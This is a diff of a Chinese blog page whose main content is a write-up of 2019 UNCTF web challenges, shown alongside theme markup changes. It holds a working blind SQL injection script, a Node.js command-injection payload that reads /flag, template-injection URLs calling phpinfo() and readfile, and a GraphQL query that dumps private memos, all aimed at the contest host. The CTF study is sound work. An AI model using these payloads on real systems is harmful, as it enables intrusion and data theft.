@@ -1,26 +1,11 @@
 <!DOCTYPE html>
-<html>
+<html lang=zh>
 <head>
-    
-
-    
-
-    
-
-
-
+    <!-- so meta -->
     <meta charset="utf-8">
-    
-    
-    
-    
-    <title>2019UNCTF WEB题解 | osword&#39;s blog | 小刀</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-    
-    <meta name="theme-color" content="#3F51B5">
-    
-    
-    <meta name="keywords" content="CTF">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
     <meta name="description" content="Twice_Insert利用update处存在盲注，修改密码后，注入布尔语句回显不一致 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import requestsimport s">
 <meta property="og:type" content="article">
 <meta property="og:title" content="2019UNCTF WEB题解">
@@ -62,176 +47,142 @@
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/1571658224467.png">
     
-        <link rel="alternate" type="application/atom+xml" title="osword&#39;s blog" href="/atom.xml">
     
-    <link rel="shortcut icon" href="/favicon.ico">
-    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
-    <script>window.lazyScripts=[]</script>
-
-    <!-- custom head -->
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
     
+    <!-- title -->
+    <title>2019UNCTF WEB题解</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
 
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="osword&#39;s blog" type="application/atom+xml" />
+    
 <meta name="generator" content="Hexo 4.2.1"></head>
 
-<body>
-    <div id="loading" class="active"></div>
-
-    <aside id="menu" class="hide" >
-  <div class="inner flex-row-vertical">
-    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
-        <i class="icon icon-lg icon-close"></i>
-    </a>
-    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
-      <div class="brand">
-        <a href="/" class="avatar waves-effect waves-circle waves-light">
-          <img src="/img/avatar.jpg">
-        </a>
-        <hgroup class="introduce">
-          <h5 class="nickname">osword</h5>
-          <a href="mailto:929337105@qq.com" title="929337105@qq.com" class="mail">929337105@qq.com</a>
-        </hgroup>
-      </div>
-    </div>
-    <div class="scroll-wrap flex-col">
-      <ul class="nav">
-        
-            <li class="waves-block waves-effect">
-              <a href="/"  >
-                <i class="icon icon-lg icon-home"></i>
-                主页
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="/archives"  >
-                <i class="icon icon-lg icon-archives"></i>
-                Archives
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://zhzhdoai.github.io/"  >
-                <i class="icon icon-lg icon-友链"></i>
-                友链
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://glotozz.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-glotozz"></i>
-                Glotozz
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://nikoeurus.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-sommus"></i>
-                Sommus
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://mochazz.github.io/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-mochazz@七月火"></i>
-                Mochazz 七月火
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://tea9.xyz/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-tea9"></i>
-                Tea 9
-              </a>
-            </li>
-        
-            <li class="waves-block waves-effect">
-              <a href="https://wulidecade.cn/" target="_blank" rel="noopener"  >
-                <i class="icon icon-lg icon-Decade"></i>
-                Decade
-              </a>
-            </li>
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
         
       </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/11/03/2019%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/10/17/ATS%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&text=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&is_video=false&description=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=2019UNCTF WEB题解&body=Check out this article: http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&title=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&name=2019UNCTF WEB题解&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://zhzhdoai.github.io/2019/11/02/2019UNCTF%E5%B7%B2%E8%A7%A3%E5%86%B3WEB%E9%A2%98%E8%A7%A3/&t=2019UNCTF WEB题解" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
     </div>
-  </div>
-</aside>
-
-    <main id="main">
-        <header class="top-header" id="header">
-    <div class="flex-row">
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
-          <i class="icon icon-lg icon-navicon"></i>
-        </a>
-        <div class="flex-col header-title ellipsis">2019UNCTF WEB题解</div>
-        
-        <div class="search-wrap" id="search-wrap">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
-                <i class="icon icon-lg icon-chevron-left"></i>
-            </a>
-            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
-            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
-                <i class="icon icon-lg icon-search"></i>
-            </a>
-        </div>
-        
-        
-        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
-            <i class="icon icon-lg icon-share-alt"></i>
-        </a>
-        
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Twice-Insert"><span class="toc-number">1.</span> <span class="toc-text">Twice_Insert</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#简单的备忘录"><span class="toc-number">2.</span> <span class="toc-text">简单的备忘录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#checkin"><span class="toc-number">3.</span> <span class="toc-text">checkin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#审计一下世界上最好的语言吧"><span class="toc-number">4.</span> <span class="toc-text">审计一下世界上最好的语言吧</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">4.1.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#bypass"><span class="toc-number">5.</span> <span class="toc-text">bypass</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload-1"><span class="toc-number">5.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目修改后"><span class="toc-number">5.2.</span> <span class="toc-text">题目修改后</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-pentest"><span class="toc-number">6.</span> <span class="toc-text">easy_pentest</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell思路"><span class="toc-number">6.1.</span> <span class="toc-text">getshell思路</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#k-amp-k"><span class="toc-number">7.</span> <span class="toc-text">k&amp;k</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">7.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp"><span class="toc-number">7.2.</span> <span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#easy-admin"><span class="toc-number">8.</span> <span class="toc-text">easy_admin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NSB-Reset-Password"><span class="toc-number">9.</span> <span class="toc-text">NSB Reset Password</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#加密的备忘录"><span class="toc-number">10.</span> <span class="toc-text">加密的备忘录</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Arbi"><span class="toc-number">11.</span> <span class="toc-text">Arbi</span></a></li></ol>
     </div>
-</header>
-<header class="content-header post-header">
-
-    <div class="container fade-scale">
-        <h1 class="title">2019UNCTF WEB题解</h1>
-        <h5 class="subtitle">
-            
-                <time datetime="2019-11-02T13:16:50.000Z" itemprop="datePublished" class="page-time">
-  2019-11-02
-</time>
-
-
-            
-        </h5>
-    </div>
+  </span>
+</div>
 
     
-
-
-</header>
-
-
-<div class="container body-wrap">
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
     
-    <aside class="post-widget">
-        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
-            <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Twice-Insert"><span class="post-toc-number">1.</span> <span class="post-toc-text">Twice_Insert</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#简单的备忘录"><span class="post-toc-number">2.</span> <span class="post-toc-text">简单的备忘录</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#checkin"><span class="post-toc-number">3.</span> <span class="post-toc-text">checkin</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#审计一下世界上最好的语言吧"><span class="post-toc-number">4.</span> <span class="post-toc-text">审计一下世界上最好的语言吧</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#payload"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">payload</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#bypass"><span class="post-toc-number">5.</span> <span class="post-toc-text">bypass</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#payload-1"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">payload</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目修改后"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">题目修改后</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#easy-pentest"><span class="post-toc-number">6.</span> <span class="post-toc-text">easy_pentest</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#getshell思路"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">getshell思路</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#k-amp-k"><span class="post-toc-number">7.</span> <span class="post-toc-text">k&amp;k</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析"><span class="post-toc-number">7.1.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp"><span class="post-toc-number">7.2.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#easy-admin"><span class="post-toc-number">8.</span> <span class="post-toc-text">easy_admin</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#NSB-Reset-Password"><span class="post-toc-number">9.</span> <span class="post-toc-text">NSB Reset Password</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#加密的备忘录"><span class="post-toc-number">10.</span> <span class="post-toc-text">加密的备忘录</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Arbi"><span class="post-toc-number">11.</span> <span class="post-toc-text">Arbi</span></a></li></ol>
-        </nav>
-    </aside>
+    <h1 class="posttitle" itemprop="name headline">
+        2019UNCTF WEB题解
+    </h1>
 
 
-<article id="post-2019UNCTF已解决WEB题解"
-  class="post-article article-type-post fade" itemprop="blogPost">
 
-    <div class="post-card">
-        <h1 class="post-card-title">2019UNCTF WEB题解</h1>
-        <div class="post-meta">
-            <time class="post-time" title="2019-11-02 21:16:50" datetime="2019-11-02T13:16:50.000Z"  itemprop="datePublished">2019-11-02</time>
-
-            
-
-
-            
-<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
-    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
-</span>
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">osword's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-11-02T13:16:50.000Z" itemprop="datePublished">2019-11-02</time>
+        
+      
+    </div>
 
 
-        </div>
-        <div class="post-content" id="post-content" itemprop="postContent">
-            <h1 id="Twice-Insert"><a href="#Twice-Insert" class="headerlink" title="Twice_Insert"></a>Twice_Insert</h1><p>利用update处存在盲注，修改密码后，注入布尔语句回显不一致</p>
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/CTF/" rel="tag">CTF</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="Twice-Insert"><a href="#Twice-Insert" class="headerlink" title="Twice_Insert"></a>Twice_Insert</h1><p>利用update处存在盲注，修改密码后，注入布尔语句回显不一致</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str1= string.printable</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">regestr</span><span class="params">(username)</span>:</span></span><br><span class="line">    urlregester = <span class="string">"http://101.71.29.5:10002/login_create.php"</span></span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">'username'</span>:username,</span><br><span class="line">        <span class="string">'password'</span>:<span class="string">'zxasqw159'</span>,</span><br><span class="line">        <span class="string">'re_password'</span>:<span class="string">'zxasqw159'</span>,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Register'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    repregester = requests.post(urlregester,data=data1)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Register</span><span class="params">(username)</span>:</span></span><br><span class="line">    urlregester = <span class="string">"http://101.71.29.5:10002/login_create.php"</span></span><br><span class="line">    data1 = &#123;</span><br><span class="line">        <span class="string">'username'</span>:username,</span><br><span class="line">        <span class="string">'password'</span>:<span class="string">'zxasqw159'</span>,</span><br><span class="line">        <span class="string">'re_password'</span>:<span class="string">'zxasqw159'</span>,</span><br><span class="line">        <span class="string">'submit'</span>:<span class="string">'Register'</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    repregester = rep.post(urlregester,data=data1)</span><br><span class="line">    sess=repregester.headers[<span class="string">'Set-Cookie'</span>][<span class="number">10</span>:<span class="number">36</span>]</span><br><span class="line">    <span class="keyword">return</span> sess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># first to register  new username id</span></span><br><span class="line">result=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">80</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">        rep=requests.session()</span><br><span class="line">        a=random.randint(<span class="number">1</span>,<span class="number">9999999</span>)</span><br><span class="line">        username2 = <span class="string">f'c888<span class="subst">&#123;str(a)&#125;</span>'</span></span><br><span class="line">        <span class="comment">#print(username2)</span></span><br><span class="line">        regestr(username2)</span><br><span class="line">        <span class="comment">#username2 = f"oswor&#123;str(a)&#125;' &amp;&amp; ascii(substr((select group_concat(`1`) from (select 1 union select * from fl4g)redforce),&#123;j&#125;,1))=&#123;ord(i)&#125;#"</span></span><br><span class="line">        username2 = <span class="string">f"c888<span class="subst">&#123;str(a)&#125;</span>' &amp;&amp; ascii(substr((select e.1 from (select * from (select 1)a union select * from fl4g)e limit 1 offset 1),<span class="subst">&#123;j&#125;</span>,1))=<span class="subst">&#123;ord(i)&#125;</span>#"</span></span><br><span class="line">        cookies=&#123;</span><br><span class="line">            <span class="string">'PHPSESSID'</span>:Register(username2),</span><br><span class="line">            <span class="string">'Auth'</span>:<span class="string">'1'</span></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        urllogin=<span class="string">"http://101.71.29.5:10002/login.php"</span></span><br><span class="line">        data2 = &#123;</span><br><span class="line">            <span class="string">'login_user'</span>:username2,</span><br><span class="line">            <span class="string">'login_password'</span>:<span class="string">'zxasqw159'</span>,</span><br><span class="line">            <span class="string">'mysubmit'</span>:<span class="string">'Login'</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        urllogin = rep.post(url=urllogin,data=data2)</span><br><span class="line">        replogin = urllogin.text</span><br><span class="line">        print(username2)</span><br><span class="line">        <span class="comment">#print(cookies)</span></span><br><span class="line">        urlchange = <span class="string">"http://101.71.29.5:10002/pass_change.php"</span></span><br><span class="line">        data3= &#123;</span><br><span class="line">            <span class="string">"current_password"</span>:<span class="string">'zxasqw159'</span>,</span><br><span class="line">            <span class="string">"password"</span>:<span class="string">'123456'</span>,</span><br><span class="line">            <span class="string">"re_password"</span>:<span class="string">'123456'</span>,</span><br><span class="line">            <span class="string">'submit'</span>:<span class="string">'Reset'</span></span><br><span class="line">        &#125;</span><br><span class="line">        repchange= rep.post(urlchange,data=data3,cookies=cookies)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"successfully"</span> <span class="keyword">in</span> repchange.text:</span><br><span class="line">            result+=i</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
 
 
@@ -239,18 +190,7 @@
 
 
 <p>UNCTF{585ae8df50433972bb6ebd76e3ebd9f4}</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1571658224467.png" alt="1571658224467" title="">
-                </div>
-                <div class="image-caption">1571658224467</div>
-            </figure>
-
-
-
-
-
+<p><img src="./1571658224467.png" alt="1571658224467"></p>
 <h1 id="简单的备忘录"><a href="#简单的备忘录" class="headerlink" title="简单的备忘录"></a>简单的备忘录</h1><p>原题</p>
 <p>参考链接：</p>
 <p><a href="https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0" target="_blank" rel="noopener">https://github.com/testerting/hacker101-ctf/tree/master/bugdb_v2/flag0</a></p>
@@ -262,16 +202,7 @@
 <p>比赛链接:<a href="http://101.71.29.5:10012/" target="_blank" rel="noopener">http://101.71.29.5:10012</a></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">query&#123;</span><br><span class="line">	allUsers&#123;</span><br><span class="line">    edges&#123;</span><br><span class="line">      node&#123;</span><br><span class="line">        id</span><br><span class="line">        username</span><br><span class="line">        memos&#123;</span><br><span class="line">          pageInfo&#123;</span><br><span class="line">            startCursor</span><br><span class="line">            endCursor</span><br><span class="line">          &#125;</span><br><span class="line">          edges&#123;</span><br><span class="line">            cursor</span><br><span class="line">            node&#123;</span><br><span class="line">              id</span><br><span class="line">              content</span><br><span class="line">              title</span><br><span class="line">              private</span><br><span class="line">              userId</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1571676027779.png" alt="1571676027779" title="">
-                </div>
-                <div class="image-caption">1571676027779</div>
-            </figure>
-
-
-
+<p><img src="./1571676027779.png" alt="1571676027779"></p>
 <h1 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h1><p>找到交互的点，只有calc</p>
 <p>需要将空格替换掉，否则会爆undefined，使用了split分割e</p>
 <p><code>/calc require(&#39;child_process&#39;).execSync(&#39;cat${IFS}/flag&#39;).toString(&quot;utf8&quot;).trim()</code></p>
@@ -282,40 +213,13 @@
 <p>截取字符进行替换拼接</p>
 <p><img src="./1571821199927.png" alt="1571821199927"></p>
 <p>在看模板，可以看到<code>{haha:searchword}与{haha:searchnum}</code>是紧挨的状态，可以利用此处进行正则匹配</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1571821248927.png" alt="1571821248927" title="">
-                </div>
-                <div class="image-caption">1571821248927</div>
-            </figure>
-
-
-
+<p><img src="./1571821248927.png" alt="1571821248927"></p>
 <h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//101.71.29.5:10003/?content=%3Csearch%3E&#123;i&#123;haha:type&#125;%3C/search%3E&amp;searchnum=&#123;end%20if&#125;&amp;type=f:phpinfo()&#125;</span></span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1571820152303.png" alt="1571820152303" title="">
-                </div>
-                <div class="image-caption">1571820152303</div>
-            </figure>
-
-
-
+<p><img src="./1571820152303.png" alt="1571820152303"></p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://101.71.29.5:10003/?content=&lt;search&gt;&#123;i&#123;haha:type&#125;.php')&#125;&lt;/search&gt;&amp;searchnum=&#123;end if&#125;&amp;type=f:readfile('flag</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="./1571821143763.png" alt="1571821143763" title="">
-                </div>
-                <div class="image-caption">1571821143763</div>
-            </figure>
-
-
-
+<p><img src="./1571821143763.png" alt="1571821143763"></p>
 <h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p>考点是利用正则匹配中 <code>\\</code> 匹配不到<code>\</code> ，这题刚放出来存在bug，由于<code>\\</code> 存在原因直接将<code>反引号</code>释放出来。直接利用反引号和通配符执行命令</p>
